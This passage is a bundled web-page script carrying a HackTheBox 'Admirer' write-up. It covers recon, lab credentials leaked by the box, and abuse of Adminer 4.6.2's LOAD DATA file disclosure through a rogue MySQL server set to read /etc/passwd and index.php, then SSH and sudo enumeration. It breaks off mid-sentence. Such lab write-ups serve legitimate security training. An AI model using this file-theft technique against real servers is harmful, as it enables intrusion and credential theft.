"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8918],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>h});var a=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function o(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},i=Object.keys(e);for(a=0;a<i.length;a++)t=i[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)t=i[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=a.createContext({}),p=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},c=function(e){var n=p(e.components);return a.createElement(l.Provider,{value:n},e.children)},u="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},m=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,i=e.originalType,l=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),u=p(t),m=r,h=u["".concat(l,".").concat(m)]||u[m]||d[m]||i;return t?a.createElement(h,s(s({ref:n},c),{},{components:t})):a.createElement(h,s({ref:n},c))}));function h(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var i=t.length,s=new Array(i);s[0]=m;var o={};for(var l in n)hasOwnProperty.call(n,l)&&(o[l]=n[l]);o.originalType=e,o[u]="string"==typeof e?e:r,s[1]=o;for(var p=2;p<i;p++)s[p]=t[p];return a.createElement.apply(null,s)}return a.createElement.apply(null,t)}m.displayName="MDXCreateElement"},6135:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>d,frontMatter:()=>i,metadata:()=>o,toc:()=>p});var a=t(87462),r=(t(67294),t(3905));const i={layout:"post",title:"Admirer ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","php","python"],date:"2020/09/26 20:00:00",thumbnail:"/img/HackTheBox/admirer.png",toc:!0},s="Information",o={unversionedId:"HackTheBox/Admirer/write-up",id:"HackTheBox/Admirer/write-up",title:"Admirer ",description:"- Name: Admirer",source:"@site/writeups/HackTheBox/Admirer/write-up.md",sourceDirName:"HackTheBox/Admirer",slug:"/HackTheBox/Admirer/write-up",permalink:"/writeups/HackTheBox/Admirer/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"php",permalink:"/writeups/tags/php"},{label:"python",permalink:"/writeups/tags/python"}],version:"current",frontMatter:{layout:"post",title:"Admirer ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","php","python"],date:"2020/09/26 20:00:00",thumbnail:"/img/HackTheBox/admirer.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Academy ",permalink:"/writeups/HackTheBox/Academy/write-up"},next:{title:"Blackfield ",permalink:"/writeups/HackTheBox/Blackfield/write-up"}},l={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:3},{value:"HTTP discovery",id:"http-discovery",level:3},{value:"HTTP enumeration",id:"http-enumeration",level:3},{value:"FTP access",id:"ftp-access",level:3},{value:"Code review",id:"code-review",level:3},{value:"Adminer exploitation",id:"adminer-exploitation",level:3},{value:"Privilege Escalation of Machine",id:"privilege-escalation-of-machine",level:3}],c={toc:p},u="wrapper";function d(e){let{components:n,...i}=e;return(0,r.kt)(u,(0,a.Z)({},c,i,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"information"},"Information"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Admirer"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/248"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Admirer",src:t(76720).Z,width:"598",height:"381"})),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"TL;DR"),": CTF-like box with a bit of code review for initial access (PHP) and pe (python)."),(0,r.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"pacman -S nmap ffuf curl filezilla pwncat\n")),(0,r.kt)("h3",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("p",null,"Port & service discovery with ",(0,r.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Fri Jun 12 13:18:53 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.187\nNmap scan report for 10.10.10.187\nHost is up (0.020s latency).\nNot shown: 65532 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)\n| ssh-hostkey:\n|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)\n|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)\n|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)\n80/tcp open  http    Apache httpd 2.4.25 ((Debian))\n| http-robots.txt: 1 disallowed entry\n|_/admin-dir\n|_http-server-header: Apache/2.4.25 (Debian)\n|_http-title: Admirer\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Fri Jun 12 13:19:24 2020 -- 1 IP address (1 host up) scanned in 30.72 seconds\n")),(0,r.kt)("h3",{id:"http-discovery"},"HTTP discovery"),(0,r.kt)("p",null,"Lets' browse the website: ",(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.187/"},"http://10.10.10.187/"),"."),(0,r.kt)("p",null,"At the bottom of the page there is an About button:"),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/Bs16XBS.jpg",alt:null})),(0,r.kt)("p",null,"When you click on it this reveal a contact form:"),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/qjnAGRG.png",alt:null})),(0,r.kt)("p",null,"On HTML source we can see a comment associated to the form."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},'<form method="post" action="#">\x3c!-- Still under development... This does not send anything yet, but it looks nice! --\x3e\n')),(0,r.kt)("p",null,"It seems it was the first rabbit hole."),(0,r.kt)("h3",{id:"http-enumeration"},"HTTP enumeration"),(0,r.kt)("p",null,"Let's try to find some web pages with ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/ffuf/ffuf"},"ffuf"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ffuf -u http://10.10.10.187/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.php -fc 403\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.1.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.187/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\n :: Extensions       : .txt .php\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Response status: 403\n________________________________________________\n\nindex.php               [Status: 200, Size: 6051, Words: 385, Lines: 154]\n.                       [Status: 200, Size: 6051, Words: 385, Lines: 154]\nrobots.txt              [Status: 200, Size: 138, Words: 21, Lines: 5]\n:: Progress: [114801/114801] :: Job [1/1] :: 1739 req/sec :: Duration: [0:01:06] :: Errors: 0 ::\n")),(0,r.kt)("p",null,"There is a ",(0,r.kt)("inlineCode",{parentName:"p"},"robots.txt"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ curl http://10.10.10.187/robots.txt\nUser-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n")),(0,r.kt)("p",null,"This pretty obvious we have to check ",(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.187/admin-dir/"},"http://10.10.10.187/admin-dir/")," but we get a\n403, there isn't any index so let's continue with ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/ffuf/ffuf"},"ffuf"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ffuf -u http://10.10.10.187/admin-dir/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.php -fc 403\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.1.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.187/admin-dir/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\n :: Extensions       : .txt .php\n :: Follow redirects : true\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Response status: 403\n________________________________________________\n\ncontacts.txt            [Status: 200, Size: 350, Words: 19, Lines: 30]\ncredentials.txt         [Status: 200, Size: 136, Words: 5, Lines: 12]\n:: Progress: [114801/114801] :: Job [1/1] :: 1688 req/sec :: Duration: [0:01:08] :: Errors: 0 ::\n")),(0,r.kt)("p",null,"At ",(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.187/admin-dir/contacts.txt"},"http://10.10.10.187/admin-dir/contacts.txt")," we have some name and email\naddresses:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"##########\n# admins #\n##########\n# Penny\nEmail: p.wise@admirer.htb\n\n\n##############\n# developers #\n##############\n# Rajesh\nEmail: r.nayyar@admirer.htb\n\n# Amy\nEmail: a.bialik@admirer.htb\n\n# Leonard\nEmail: l.galecki@admirer.htb\n\n\n\n#############\n# designers #\n#############\n# Howard\nEmail: h.helberg@admirer.htb\n\n# Bernadette\nEmail: b.rauch@admirer.htb\n")),(0,r.kt)("p",null,"And at ",(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.187/admin-dir/credentials.txt"},"http://10.10.10.187/admin-dir/credentials.txt")," we have some creds:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ini"},"[Internal mail account]\nw.cooper@admirer.htb\nfgJr6q#S\\W:$P\n\n[FTP account]\nftpuser\n%n?4Wz}R$tTF7\n\n[Wordpress account]\nadmin\nw0rdpr3ss01!\n")),(0,r.kt)("h3",{id:"ftp-access"},"FTP access"),(0,r.kt)("p",null,"As the FTP port is open we can try to access it with the credentials."),(0,r.kt)("p",null,"Let's launch ",(0,r.kt)("a",{parentName:"p",href:"https://filezilla-project.org/"},"FileZilla")," to download the files."),(0,r.kt)("p",null,"It's also possible to use the CLI:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ftp 10.10.10.187\nConnected to 10.10.10.187.\n220 (vsFTPd 3.0.3)\nName (10.10.10.187:cyfun): ftpuser\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-x---    2 0        111          4096 Dec 03  2019 .\ndrwxr-x---    2 0        111          4096 Dec 03  2019 ..\n-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql\n-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"dump.sql")," contains the table of images displayed on the home page, nothing\ninteresting except the db name ",(0,r.kt)("inlineCode",{parentName:"p"},"admirerdb")," and knowing it's served on localhost."),(0,r.kt)("p",null,"Let's extract the website source:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ mkdir website && tar xaf html.tar.gz -C website\n")),(0,r.kt)("p",null,"There is a ",(0,r.kt)("inlineCode",{parentName:"p"},"w4ld0s_s3cr3t_d1r")," fodler which is the same as ",(0,r.kt)("inlineCode",{parentName:"p"},"admin-dir")," and\ncontains the same files except that there is one entry more in ",(0,r.kt)("inlineCode",{parentName:"p"},"credentials.txt"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ls -l website\ntotal 28\ndrwxr-x--- 6 cyfun cyfun 4096 juin   6  2019 assets\ndrwxr-x--- 4 cyfun cyfun 4096 d\xe9c.   2  2019 images\n-rw-r----- 1 cyfun cyfun 4613 d\xe9c.   3  2019 index.php\n-rw-r----- 1 cyfun cyfun  134 d\xe9c.   1  2019 robots.txt\ndrwxr-x--- 2 cyfun cyfun 4096 d\xe9c.   2  2019 utility-scripts\ndrwxr-x--- 2 cyfun cyfun 4096 d\xe9c.   2  2019 w4ld0s_s3cr3t_d1r\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"credentials.txt")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ini"},"[Bank Account]\nwaldo.11\nEzy]m27}OREc$\n")),(0,r.kt)("p",null,"We can now read the PHP part of ",(0,r.kt)("inlineCode",{parentName:"p"},"index.php"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},'<?php\n  $servername = "localhost";\n  $username = "waldo";\n  $password = "]F7jLHw:*G>UPrTo}~A"d6b";\n  $dbname = "admirerdb";\n\n  // Create connection\n  $conn = new mysqli($servername, $username, $password, $dbname);\n  // Check connection\n  if ($conn->connect_error) {\n      die("Connection failed: " . $conn->connect_error);\n  }\n\n  $sql = "SELECT * FROM items";\n  $result = $conn->query($sql);\n\n  if ($result->num_rows > 0) {\n    // output data of each row\n    while($row = $result->fetch_assoc()) {\n      echo "<article class=\'thumb\'>";\n      echo "<a href=\'".$row["image_path"]."\' class=\'image\'><img src=\'".$row["thumb_path"]."\' alt=\'\' /></a>";\n      echo "<h2>".$row["title"]."</h2>";\n      echo "<p>".$row["text"]."</p>";\n      echo "</article>";\n    }\n  } else {\n    echo "0 results";\n  }\n  $conn->close();\n?>\n')),(0,r.kt)("p",null,"That gives us the MariaDB credentials."),(0,r.kt)("p",null,"But what will interest us more is what's inside ",(0,r.kt)("inlineCode",{parentName:"p"},"utility-scripts"),"\n(accessible publicly)."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"website/utility-scripts\n\u251c\u2500\u2500 admin_tasks.php\n\u251c\u2500\u2500 db_admin.php\n\u251c\u2500\u2500 info.php\n\u2514\u2500\u2500 phptest.php\n")),(0,r.kt)("p",null,"So we have:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"admin_tasks.php"),": an admin toolkit that is probably vulnerable and we'll use to gain a shell"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"db_admin.php"),": leaking MariaDB credentials, it's the same user as in ",(0,r.kt)("inlineCode",{parentName:"li"},"index.php")," but the password is different, one of the two must be outdated."),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"info.php"),": a ",(0,r.kt)("inlineCode",{parentName:"li"},"phpinfo()"),(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"DOCUMENT_ROOT"),": ",(0,r.kt)("inlineCode",{parentName:"li"},"/var/www/html")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"disable_functions"),": default"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"open_basedir"),": ",(0,r.kt)("inlineCode",{parentName:"li"},"/var/www/html")))),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"phptest.php"),": a dummy file")),(0,r.kt)("h3",{id:"code-review"},"Code review"),(0,r.kt)("p",null,"Here is the list of possible operations:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Available options:\n  1) View system uptime\n  2) View logged in users\n  3) View crontab (current user only)\n  4) Backup passwd file (not working)\n  5) Backup shadow file (not working)\n  6) Backup web data (not working)\n  7) Backup database (not working)\n\n  NOTE: Options 4-7 are currently NOT working because they need root privileges.\n        I'm leaving them in the valid tasks in case I figure out a way\n        to securely run code as root from a PHP page.\n")),(0,r.kt)("p",null,"And that's the vulnerable code without the comments and HTML:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"  <?php\n  if(isset($_REQUEST['task']))\n  {\n    $task = $_REQUEST['task'];\n    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||\n       $task == '5' || $task == '6' || $task == '7')\n    {\n      echo str_replace(\"\\n\", \"<br />\", shell_exec(\"/opt/scripts/admin_tasks.sh $task 2>&1\"));\n    }\n    else\n    {\n      echo(\"Invalid task.\");\n    }\n  }\n  ?>\n")),(0,r.kt)("p",null,"The task number is directly passed into a ",(0,r.kt)("inlineCode",{parentName:"p"},"shell_exec()")," without any security\nso we would have been able to do a system command injection if task was not\ncompared to a whitelist of allowed task number. It's a loose comparison so\nthere is maybe a way to bypass it."),(0,r.kt)("h3",{id:"adminer-exploitation"},"Adminer exploitation"),(0,r.kt)("p",null,"In the end ",(0,r.kt)("inlineCode",{parentName:"p"},"admin_tasks.php")," seems to be a rabbit hole."),(0,r.kt)("p",null,"Now there is a step requiring guessing. In ",(0,r.kt)("inlineCode",{parentName:"p"},"db_admin.php")," there is a comment:"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"TODO: Finish implementing this or find a better open source alternative")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.187/utility-scripts/db_admin.php"},"http://10.10.10.187/utility-scripts/db_admin.php")," gives a 404, so maybe the dev\nfound an alternative."),(0,r.kt)("p",null,"An alternative to ",(0,r.kt)("inlineCode",{parentName:"p"},"db_admin.php")," is Adminer (formerly phpMinAdmin) that is\nsimilar to phpMyAdmin. Also Adminer is the name of the box..."),(0,r.kt)("p",null,"From ",(0,r.kt)("a",{parentName:"p",href:"https://www.adminer.org/"},"adminer.org")),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB.")),(0,r.kt)("p",null,"We can access to ",(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.187/utility-scripts/adminer.php"},"http://10.10.10.187/utility-scripts/adminer.php")),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/CeddYF5.png",alt:null})),(0,r.kt)("p",null,"But we can't login with both set of credentials we found earlier."),(0,r.kt)("p",null,"We are using Adminer 4.6.2, so let's see if there are security fix in 4.6.3."),(0,r.kt)("p",null,"Ref. ",(0,r.kt)("a",{parentName:"p",href:"https://sourceforge.net/p/adminer/news/2018/06/adminer-463-released/"},"changelog")),(0,r.kt)("p",null,"We can see ",(0,r.kt)("inlineCode",{parentName:"p"},"MySQL: Disallow LOAD DATA LOCAL INFILE")," which was used in\n",(0,r.kt)("a",{parentName:"p",href:"https://www.acunetix.com/vulnerabilities/web/adminer-4-6-2-file-disclosure-vulnerability/"},"Adminer 4.6.2 file disclosure vulnerability"),"."),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"Adminer versions up to (and including) 4.6.2 supported the use of the SQL statement LOAD DATA INFILE. It was possible to use this SQL statement to read arbitrary local files because of a protocol flaw in MySQL.")),(0,r.kt)("p",null,"So let's read the associated references:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability"},"Adminer leaks passwords; Magecart hackers rejoice")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f"},"Adminer Script Results to Pwning Server?, Private Bug Bounty Program"))),(0,r.kt)("p",null,"So we need to host a database and access it remotely from Adminer."),(0,r.kt)("p",null,"By searching around, I found this msf issue:\n",(0,r.kt)("a",{parentName:"p",href:"https://github.com/rapid7/metasploit-framework/issues/12222"},"[Suggestion] Add rogue MySQL server for file theft"),".\nbcoles asked msf team to create of rogue server module for this kind of exploit.\nThere is still nothing in msf but the author gave an example with this python\nscript: ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/Gifts/Rogue-MySql-Server"},"https://github.com/Gifts/Rogue-MySql-Server")),(0,r.kt)("p",null,"Let's run it so start the fake database as a daemon:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ python2 rogue_mysql_server.py\n")),(0,r.kt)("p",null,"In ",(0,r.kt)("inlineCode",{parentName:"p"},"rogue_mysql_server.py")," I changed the filelist to read ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/passwd")," instead\nof ",(0,r.kt)("inlineCode",{parentName:"p"},"c:\\windows\\win.ini"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"filelist = (\n#    r'c:\\boot.ini',\n#    r'c:\\windows\\win.ini',\n#    r'c:\\windows\\system32\\drivers\\etc\\hosts',\n    '/etc/passwd',\n#    '/etc/shadow',\n)\n")),(0,r.kt)("p",null,"We can login by setting our IP address and put whatever credentials."),(0,r.kt)("p",null,"Yet we can't read ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/passwd")," because of open_basedir value."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/aNbcknQ.png",alt:null})),(0,r.kt)("p",null,"The file we need to read is ",(0,r.kt)("inlineCode",{parentName:"p"},"index.php")," with the up-to-date credentials."),(0,r.kt)("p",null,"We can change ",(0,r.kt)("inlineCode",{parentName:"p"},"filelist")," (add ",(0,r.kt)("inlineCode",{parentName:"p"},"'/var/www/html/index.php'"),") again and restart the rogue server."),(0,r.kt)("p",null,"Then if we read the rogue server's logs:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ cat mysql.log | grep password\n...\n$password = "&<h5b~yK3F#{PaPB&dA}{H>";\n...\n')),(0,r.kt)("p",null,"The we can re-use those credentials over SSH:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ssh waldo@10.10.10.187\nwaldo@10.10.10.187's password:\nLinux admirer 4.9.0-12-amd64 x86_64 GNU/Linux\n\nThe programs included with the Devuan GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDevuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nYou have new mail.\nLast login: Sun Jul 12 16:20:44 2020 from 10.10.14.36\nwaldo@admirer:~$\n")),(0,r.kt)("h3",{id:"privilege-escalation-of-machine"},"Privilege Escalation of Machine"),(0,r.kt)("p",null,"The way to follow seems obvious:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"waldo@admirer:~$ sudo -l\n[sudo] password for waldo:\nMatching Defaults entries for waldo on admirer:\n    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, listpw=always\n\nUser waldo may run the following commands on admirer:\n    (ALL) SETENV: /opt/scripts/admin_tasks.sh\n")),(0,r.kt)("p",null,"So let's read the script ",(0,r.kt)("inlineCode",{parentName:"p"},"/opt/scripts/admin_tasks.sh"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},'#!/bin/bash\n\nview_uptime()\n{\n    /usr/bin/uptime -p\n}\n\nview_users()\n{\n    /usr/bin/w\n}\n\nview_crontab()\n{\n    /usr/bin/crontab -l\n}\n\nbackup_passwd()\n{\n    if [ "$EUID" -eq 0 ]\n    then\n        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."\n        /bin/cp /etc/passwd /var/backups/passwd.bak\n        /bin/chown root:root /var/backups/passwd.bak\n        /bin/chmod 600 /var/backups/passwd.bak\n        echo "Done."\n    else\n        echo "Insufficient privileges to perform the selected operation."\n    fi\n}\n\nbackup_shadow()\n{\n    if [ "$EUID" -eq 0 ]\n    then\n        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."\n        /bin/cp /etc/shadow /var/backups/shadow.bak\n        /bin/chown root:shadow /var/backups/shadow.bak\n        /bin/chmod 600 /var/backups/shadow.bak\n        echo "Done."\n    else\n        echo "Insufficient privileges to perform the selected operation."\n    fi\n}\n\nbackup_web()\n{\n    if [ "$EUID" -eq 0 ]\n    then\n        echo "Running backup script in the background, it might take a while..."\n        /opt/scripts/backup.py &\n    else\n        echo "Insufficient privileges to perform the selected operation."\n    fi\n}\n\nbackup_db()\n{\n    if [ "$EUID" -eq 0 ]\n    then\n        echo "Running mysqldump in the background, it may take a while..."\n        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &\n        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &\n    else\n        echo "Insufficient privileges to perform the selected operation."\n    fi\n}\n\n\n\n# Non-interactive way, to be used by the web interface\nif [ $# -eq 1 ]\nthen\n    option=$1\n    case $option in\n        1) view_uptime ;;\n        2) view_users ;;\n        3) view_crontab ;;\n        4) backup_passwd ;;\n        5) backup_shadow ;;\n        6) backup_web ;;\n        7) backup_db ;;\n\n        *) echo "Unknown option." >&2\n    esac\n\n    exit 0\nfi\n\n\n# Interactive way, to be called from the command line\noptions=("View system uptime"\n         "View logged in users"\n         "View crontab"\n         "Backup passwd file"\n         "Backup shadow file"\n         "Backup web data"\n         "Backup DB"\n         "Quit")\n\necho\necho "[[[ System Administration Menu ]]]"\nPS3="Choose an option: "\nCOLUMNS=11\nselect opt in "${options[@]}"; do\n    case $REPLY in\n        1) view_uptime ; break ;;\n        2) view_users ; break ;;\n        3) view_crontab ; break ;;\n        4) backup_passwd ; break ;;\n        5) backup_shadow ; break ;;\n        6) backup_web ; break ;;\n        7) backup_db ; break ;;\n        8) echo "Bye!" ; break ;;\n\n        *) echo "Unknown option." >&2\n    esac\ndone\n\nexit 0\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"backup_shadow")," and ",(0,r.kt)("inlineCode",{parentName:"p"},"backup_passwd")," seem secure, ",(0,r.kt)("inlineCode",{parentName:"p"},"backup_db")," won't help us so\nlet's dig in ",(0,r.kt)("inlineCode",{parentName:"p"},"backup_web"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},'backup_web()\n{\n    if [ "$EUID" -eq 0 ]\n    then\n        echo "Running backup script in the background, it might take a while..."\n        /opt/scripts/backup.py &\n    else\n        echo "Insufficient privileges to perform the selected operation."\n    fi\n}\n')),(0,r.kt)("p",null,"It just launch 